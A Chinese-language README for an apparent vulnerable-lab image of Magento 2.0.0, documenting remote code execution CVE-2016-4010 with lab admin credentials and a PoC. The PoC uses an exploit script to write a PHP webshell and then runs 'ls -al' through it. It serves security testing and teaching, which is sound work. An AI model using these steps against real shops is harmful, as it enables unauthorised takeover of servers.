### 环境说明

* src/magento/2.1.6

  * 本镜像目前无法使用

* src/magento/2.0.0

  * 后台地址

    http://127.0.0.1/index.php/admin

  * 管理员账号

    admin/admin123



## Magento代码执行漏洞(CVE-2016-4010)

测试镜像

- src/magento/2.0.0

要求

- 目标站点的Magento开启了REST API
- 目标站点首页需要存在包含关键字 "guest-carts" 的JS代码 

影响版本

- magento<= 2.0.6

参考链接

- [Magento未授权远程代码执行漏洞(CVE-2016-4010)的分析与利用](https://github.com/brianwrf/Magento-CVE-2016-4010)

Poc

1、访问url  `http://172.17.0.2/index.php/checkout/`，添加任意商品到购物车并点击购物车付款

2、在付款页面填写表单，并点击update提交，在发送的post请求中，查找如下结构的url：

`http://172.17.0.2/index.php/rest/default/V1/guest-carts/c8216937e28f47986da576d2644f0e8b/billing-address`

记录其中的32位16进制数

3、使用`writefile-exp.php`进行测试，将获取的32位数作为第二个参数

```shell
php writefile-exp.php "http://172.17.0.2/index.php c8216937e28f47986da576d2644f0e8b /var/www/html/shell.php
```

4、访问`http://172.17.0.2/shell.php?0=ls%20-al`，验证shell是否写入成功